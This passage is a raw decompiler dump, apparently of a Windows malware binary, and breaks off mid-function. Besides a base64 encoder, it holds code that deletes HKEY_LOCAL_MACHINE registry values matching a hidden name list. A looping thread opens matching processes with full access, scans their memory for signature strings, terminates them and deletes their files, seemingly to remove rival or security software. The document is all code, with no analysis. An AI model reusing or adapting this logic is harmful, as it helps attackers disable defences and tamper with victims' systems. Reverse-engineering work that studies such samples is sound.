  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  
}; // idb
BYTE byte_4931D0[260]; // idb
BYTE Data[260]; // idb
int dword_4933D8; // idb
CHAR Destination[260]; // idb
CHAR byte_4934E0[260]; // idb
BYTE ApplicationName; // idb
char FullPath; // idb
CHAR byte_4937EC; // idb
int dword_4938F0; // weak
int dword_4938F4; // weak
int dword_4938F8; // weak
int dword_493900; // weak
int (__cdecl *dword_493904)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__cdecl *dword_493908)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__cdecl *dword_49390C)(_DWORD); // weak
int (__stdcall *dword_493910)(_DWORD, _DWORD); // weak
int (__stdcall *dword_493914)(_DWORD, _DWORD); // weak
int dword_493918; // weak
SERVICE_STATUS_HANDLE hServiceStatus; // idb
char *dword_493920; // idb
int dword_493928; // weak
int dword_49392C; // weak
int dword_493930; // weak
_UNKNOWN unk_493934; // weak
LCID dword_49393C; // idb
UINT dword_49394C; // idb
int dword_493954; // weak
int dword_493958; // weak
int dword_493970; // weak
int dword_493974; // weak
int dword_49397C; // weak
int dword_49398C; // weak
char byte_493994; // weak
int dword_493998; // weak
int dword_49399C; // weak
int dword_4939A0; // weak
CHAR Filename[260]; // idb
int dword_493AA8; // weak
int (*dword_493AAC)(void); // weak
int dword_493AB0; // weak
int dword_493AB4; // weak
int dword_493AB8; // weak
int (__cdecl *dword_493ABC)(_DWORD); // weak
int (__stdcall *dword_493AC0)(_DWORD, _DWORD, _DWORD, _DWORD); // weak
int (*dword_493AC4)(void); // weak
int (__stdcall *dword_493AC8)(_DWORD); // weak
int dword_493ACC; // weak
int dword_493AD0; // weak
int dword_493AD4; // weak
int dword_493AD8; // weak
int dword_493ADC; // weak
LPVOID lpMem; // idb
int dword_493AE4; // weak
size_t Count; // idb
HANDLE hHeap; // idb
int dword_494B20[]; // weak
_UNKNOWN unk_494B24; // weak
UINT uNumber; // idb
int dword_494C24; // weak
int dword_494C28; // weak
int dword_494C2C; // weak
int dword_494C30; // weak
int (*dword_494C34)(void); // weak
UINT CodePage; // idb
_DWORD dword_494C40[3]; // idb
int dword_494C4C; // weak
char byte_494C60[256]; // idb
_UNKNOWN unk_494D60; // weak
char byte_494D61[259]; // idb
LCID Locale; // idb
int dword_494E68; // weak


//----- (00401000) --------------------------------------------------------
int __cdecl sub_401000(int a1, int a2, int a3, int a4)
{
  int v4; // esi
  int v5; // ebx
  char v6; // cl
  int v7; // edi
  int v8; // esi
  int v9; // ebx
  char v10; // al
  int v11; // ebx
  unsigned __int8 v12; // cl
  int v13; // ebx
  char v14; // cl
  int v15; // ebx
  int v16; // ebx
  int v17; // ebx
  unsigned __int8 v18; // cl
  int v19; // ebx
  int v21; // [esp+Ch] [ebp-14h]
  int v22; // [esp+10h] [ebp-10h]
  signed int v23; // [esp+14h] [ebp-Ch]
  int v24; // [esp+18h] [ebp-8h]
  char v25[3]; // [esp+1Ch] [ebp-4h] BYREF
  unsigned __int8 v26; // [esp+1Fh] [ebp-1h]

  v4 = 0;
  v5 = 0;
  v21 = 0;
  v24 = 0;
  v22 = a3;
  while ( v4 < a3 )
  {
    v23 = 3;
    if ( v22 < 3 )
      v23 = v22;
    qmemcpy(v25, "===", sizeof(v25));
    if ( v23 > 0 )
      qmemcpy(v25, (const void *)(a1 + v4), v23);
    v6 = v25[0];
    v26 = (unsigned __int8)v25[0] >> 2;
    if ( v5 )
    {
      v7 = a4;
      if ( a4 <= 0 )
      {
        v8 = a2;
      }
      else
      {
        v8 = a2;
        if ( !((v5 - v24) % a4) )
        {
          *(_BYTE *)(v5 + a2) = 13;
          v9 = v5 + 1;
          *(_BYTE *)(v9 + a2) = 10;
          v5 = v9 + 1;
          v24 += 2;
        }
      }
    }
    else
    {
      v8 = a2;
      v7 = a4;
    }
    *(_BYTE *)(v5 + v8) = *((_BYTE *)off_40F030 + v26);
    v10 = v25[1];
    v11 = v5 + 1;
    v12 = ((unsigned __int8)v25[1] >> 4) + 16 * (v6 & 3);
    if ( v11 && v7 > 0 )
    {
      if ( !((v11 - v24) % v7) )
      {
        *(_BYTE *)(v11 + v8) = 13;
        v13 = v11 + 1;
        *(_BYTE *)(v13 + v8) = 10;
        v11 = v13 + 1;
        v24 += 2;
      }
      v10 = v25[1];
    }
    *(_BYTE *)(v11 + v8) = *((_BYTE *)off_40F030 + v12);
    v14 = v25[2];
    v15 = v11 + 1;
    v26 = ((unsigned __int8)v25[2] >> 6) + 4 * (v10 & 0xF);
    if ( v15 && v7 > 0 && !((v15 - v24) % v7) )
    {
      *(_BYTE *)(v15 + v8) = 13;
      v16 = v15 + 1;
      *(_BYTE *)(v16 + v8) = 10;
      v15 = v16 + 1;
      v24 += 2;
    }
    *(_BYTE *)(v15 + v8) = *((_BYTE *)off_40F030 + v26);
    v17 = v15 + 1;
    if ( v23 <= 2 )
      *(_BYTE *)(v17 + v8 - 1) = 61;
    v18 = v14 & 0x3F;
    if ( v17 && v7 > 0 && !((v17 - v24) % v7) )
    {
      *(_BYTE *)(v17 + v8) = 13;
      v19 = v17 + 1;
      *(_BYTE *)(v19 + v8) = 10;
      v17 = v19 + 1;
      v24 += 2;
    }
    *(_BYTE *)(v17 + v8) = *((_BYTE *)off_40F030 + v18);
    v5 = v17 + 1;
    if ( v23 <= 1 )
      *(_BYTE *)(v5 + v8 - 1) = '=';
    v4 = v21 + 3;
    v22 -= 3;
    v21 += 3;
  }
  return v5;
}
// 40F030: using guessed type void *off_40F030;

//----- (00401198) --------------------------------------------------------
LSTATUS sub_401198()
{
  char *v0; // eax
  LSTATUS result; // eax
  int i; // edi
  HMODULE v3; // esi
  char *v4; // eax
  FARPROC v5; // eax
  CHAR Name[260]; // [esp+0h] [ebp-110h] BYREF
  int v7; // [esp+104h] [ebp-Ch]
  DWORD dwIndex; // [esp+108h] [ebp-8h]
  HKEY phkResult; // [esp+10Ch] [ebp-4h] BYREF

  dwIndex = 0;
  v0 = sub_40347E(SubKey, 4);
  result = RegOpenKeyA(HKEY_LOCAL_MACHINE, v0, &phkResult);
  if ( !result )
  {
    v7 = sub_4034AE(&aO, 0);
    while ( !RegEnumKeyA(phkResult, dwIndex, Name, 0x104u) )
    {
      _strupr(Name);
      for ( i = 0; i < v7; ++i )
      {
        sub_40347E(&aO, i);
        if ( sub_403C88() )
        {
          v3 = LoadLibraryA_0(LibFileName);
          if ( v3 )
          {
            v4 = sub_40347E(ProcName, 2);
            v5 = GetProcAddress_0(v3, v4);
            if ( v5 )
              ((void (__stdcall *)(HKEY, CHAR *))v5)(phkResult, Name);
            FreeLibrary(v3);
          }
        }
      }
      ++dwIndex;
    }
    result = RegCloseKey(phkResult);
  }
  return result;
}
// 41098B: using guessed type char aO;

//----- (00401284) --------------------------------------------------------
int __stdcall sub_401284(HKEY hKey, LPCSTR phkResult)
{
  int v3; // ebx
  BYTE Data[1024]; // [esp+4h] [ebp-814h] BYREF
  CHAR ValueName[1024]; // [esp+404h] [ebp-414h] BYREF
  char *v6; // [esp+804h] [ebp-14h]
  DWORD Type; // [esp+808h] [ebp-10h] BYREF
  DWORD cchValueName; // [esp+80Ch] [ebp-Ch] BYREF
  DWORD cbData; // [esp+810h] [ebp-8h] BYREF
  DWORD dwIndex; // [esp+814h] [ebp-4h]
  HKEY hKeya; // [esp+820h] [ebp+8h]

  dwIndex = 0;
  cchValueName = 1024;
  cbData = 1024;
  if ( RegOpenKeyA(hKey, phkResult, (PHKEY)&phkResult) )
    return 0;
  hKeya = (HKEY)sub_4034AE(&aO, 0);
  while ( 1 )
  {
    v3 = 0;
    cchValueName = 1024;
    cbData = 1024;
    if ( RegEnumValueA((HKEY)phkResult, dwIndex, ValueName, &cchValueName, 0, &Type, Data, &cbData) )
      break;
    if ( Type != 1 )
      Data[0] = 0;
    _strupr(ValueName);
    _strupr((char *)Data);
    if ( (int)hKeya > 0 )
    {
      do
      {
        v6 = sub_40347E(&aO, v3);
        if ( sub_403C88() || sub_403C88() || !strcmp(ValueName, Str2) )
          RegDeleteValueA((HKEY)phkResult, ValueName);
        ++v3;
      }
      while ( v3 < (int)hKeya );
    }
    ++dwIndex;
  }
  RegCloseKey((HKEY)phkResult);
  return 0;
}
// 41098B: using guessed type char aO;

//----- (004013A9) --------------------------------------------------------
int sub_4013A9()
{
  CHAR SubKey[512]; // [esp+4h] [ebp-200h] BYREF

  sub_401198();
  sub_403CE3(SubKey, 2);
  sub_401284(HKEY_LOCAL_MACHINE, SubKey);
  sub_403CE3(SubKey, 6);
  return sub_401284(HKEY_LOCAL_MACHINE, SubKey);
}

//----- (004013FA) --------------------------------------------------------
int __stdcall sub_4013FA(DWORD th32ProcessID, int a2)
{
  int v2; // ebx
  DWORD v3; // eax
  size_t v4; // eax
  int v5; // esi
  size_t v6; // ebx
  SIZE_T v7; // eax
  CHAR Filename[260]; // [esp+8h] [ebp-444h] BYREF
  MODULEENTRY32 me; // [esp+10Ch] [ebp-340h] BYREF
  CHAR FileName[260]; // [esp+330h] [ebp-11Ch] BYREF
  HANDLE hObject; // [esp+434h] [ebp-18h]
  size_t MaxCount; // [esp+438h] [ebp-14h]
  char *String1; // [esp+43Ch] [ebp-10h]
  HANDLE hProcess; // [esp+440h] [ebp-Ch]
  SIZE_T NumberOfBytesRead; // [esp+444h] [ebp-8h] BYREF
  unsigned int v17; // [esp+448h] [ebp-4h]
  unsigned int th32ProcessIDa; // [esp+454h] [ebp+8h]

  v2 = 0;
  MaxCount = strlen(Str1);
  sub_405449(0, Name);
  v17 = sub_4034AE(aAA, 0);
  GetModuleFileNameA(0, Filename, 0x104u);
  me.dwSize = 548;
  hObject = CreateToolhelp32Snapshot(8u, th32ProcessID);
  if ( Module32First(hObject, &me) )
  {
    sub_407750();
    if ( _strcmpi(Filename, FileName) )
    {
      hProcess = OpenProcess(0x1F0FFFu, 0, me.th32ProcessID);
      if ( hProcess )
      {
        memset(byte_4131D0, 0, sizeof(byte_4131D0));
        v3 = me.modBaseSize;
        if ( me.modBaseSize >= 0x80000 )
          v3 = 0x80000;
        NumberOfBytesRead = 0;
        if ( a2 || ReadProcessMemory(hProcess, me.modBaseAddr, byte_4131D0, v3, &NumberOfBytesRead) )
        {
          for ( th32ProcessIDa = 0; th32ProcessIDa < v17; ++th32ProcessIDa )
          {
            String1 = sub_40347E(aAA, th32ProcessIDa);
            v4 = strlen(String1);
            v5 = 0;
            v6 = v4;
            if ( a2 )
            {
              v7 = v4 + 110;
              NumberOfBytesRead = v6 + 110;
            }
            else
            {
              v7 = NumberOfBytesRead;
            }
            if ( v7 - v6 != 10 )
            {
              while ( _strnicmp(Str1, &byte_4131D0[v5], MaxCount) )
              {
                if ( a2 || !_strnicmp(String1, &byte_4131D0[v5], v6) )
                {
                  TerminateProcess(hProcess, 0);
                  Sleep(0x32u);
                  sub_40347E(byte_410DF0, 1);
                  if ( !sub_403C88() )
                    sub_403F05(FileName);
                  break;
                }
                if ( ++v5 >= NumberOfBytesRead - v6 - 10 )
                  goto LABEL_21;
              }
              th32ProcessIDa = v17 + 1;
            }
LABEL_21:
            ;
          }
        }
        CloseHandle(hProcess);
        v2 = 1;
      }
    }
  }
  CloseHandle(hObject);
  return v2;
}

//----- (004015FF) --------------------------------------------------------
void __stdcall __noreturn StartAddress(LPVOID lpThreadParameter)
{
  int v1; // esi
  BOOL i; // eax
  int v3; // edi
  int v4; // esi
  char *v5; // eax
  CHAR SrcStr[260]; // [esp+Ch] [ebp-238h] BYREF
  PROCESSENTRY32 pe; // [esp+110h] [ebp-134h] BYREF
  HANDLE hSnapshot; // [esp+238h] [ebp-Ch]
  int v9; // [esp+23Ch] [ebp-8h]
  int v10; // [esp+240h] [ebp-4h]

  v1 = 95;
  v10 = sub_4034AE(&aO, 0);
  while ( 1 )
  {
    v9 = (v1 + 1) % 100;
    if ( !(v9 % 10) )
      sub_4013A9();
    pe.dwSize = 296;
    hSnapshot = CreateToolhelp32Snapshot(2u, 0);
    for ( i = Process32First(hSnapshot, &pe); i; i = Process32Next(hSnapshot, &pe) )
    {
      _splitpath(pe.szExeFile, 0, 0, SrcStr, 0);
      _strupr(SrcStr);
      if ( !v9 )
        sub_4013FA(pe.th32ProcessID, 0);
      v3 = 0;
      v4 = 0;
      if ( v10 <= 0 )
        goto LABEL_15;
      do
      {
        v5 = sub_40347E(&aO, v4);
        if ( !_strcmpi(SrcStr, v5) && (v4 != v10 - 1 || dword_493900) )
        {
          v3 = 1;
          sub_4013FA(pe.th32ProcessID, 1);
          dword_41133C = 1;
        }
        ++v4;
      }
      while ( v4 < v10 );
      if ( !v3 )
LABEL_15:
        dword_41133C = 0;
    }
    CloseHandle(hSnapshot);
    if ( dword_4938F0 )
      sub_40464B(HKEY_LOCAL_MACHINE, byte_4934E0, Destination, &ApplicationName);
    Sleep(0x64u);
    v1 = v9;
  }
}
// 41098B: using guessed type char aO;
// 41133C: using guessed type int dword_41133C;
// 4938F0: using guessed type int dword_4938F0;
// 493900: using guessed type int dword_493900;

//----- (0040174B) --------------------------------------------------------
void *__thiscall sub_40174B(void *this)
{
  return this;
}

//----- (0040174E) --------------------------------------------------------
LPVOID __thiscall sub_40174E(int this, LPCSTR lpFileName, int a3, int a4)
{
  DWORD v5; // eax
  DWORD v6; // ebx
  HANDLE v7; // eax
  DWORD v8; // eax
  bool v9; // zf
  HANDLE v10; // eax
  LPVOID result; // eax
  DWORD dwDesiredAccess; // [esp+Ch] [ebp-8h]
  DWORD FileSizeHigh; // [esp+10h] [ebp-4h] BYREF

  v5 = 0x80000000;
  v6 = 2;
  dwDesiredAccess = 4;
  FileSizeHigh = 0;
  *(_DWORD *)this = 0;
  *(_DWORD *)(this + 4) = 0;
  *(_DWORD *)(this + 8) = 0;
  if ( !a4 )
  {
    v5 = -1073741824;
    v6 = 4;
    dwDesiredAccess = 2;
  }
  if ( lpFileName )
  {
    v7 = CreateFileA(lpFileName, v5, 1u, 0, 3u, 0x20u, 0);
    *(_DWORD *)this = v7;
    if ( v7 == (HANDLE)-1 )
      return 0;
    v8 = GetFileSize(v7, &FileSizeHigh);
    v9 = FileSizeHigh == 0;
    *(_DWORD *)(this + 12) = v8;
    if ( !v9 )
    {
LABEL_9:
      CloseHandle(*(HANDLE *)this);
      return 0;
    }
    if ( a3 )
      *(_DWORD *)a3 = v8;
  }
  v10 = CreateFileMappingA(*(HANDLE *)this, 0, v6, 0, 0, 0);
  *(_DWORD *)(this + 4) = v10;
  if ( !v10 )
    goto LABEL_9;
  result = MapViewOfFile(v10, dwDesiredAccess, 0, 0, 0);
  *(_DWORD *)(this + 8) = result;
  if ( result )
    return result;
  CloseHandle(*(HANDLE *)(this + 4));
  CloseHandle(*(HANDLE *)this);
  return 0;
}

//----- (00401808) --------------------------------------------------------
HANDLE __thiscall sub_401808(int this)
{
  HANDLE result; // eax

  if ( *(_DWORD *)(this + 8) )
    UnmapViewOfFile(*(LPCVOID *)(this + 8));
  if ( *(_DWORD *)(this + 4) )
    CloseHandle(*(HANDLE *)(this + 4));
  result = *(HANDLE *)this;
  if ( *(_DWORD *)this )
    result = (HANDLE)CloseHandle(*(HANDLE *)this);
  *(_DWORD *)this = 0;
  *(_DWORD *)(this + 4) = 0;
  *(_DWORD *)(this + 8) = 0;
  return result;
}

//----- (00401841) --------------------------------------------------------
void __cdecl sub_401841(char *Dest)
{
  char v1; // al
  bool v2; // zf
  char *v3; // eax

  *((_DWORD *)Dest + 583) = sub_4047B6(0) & 1;
  sub_40372F(Dest + 2232, 10, 38, 7);
  if ( FullPath )
    sub_407750();
  sub_401A1E(Dest);
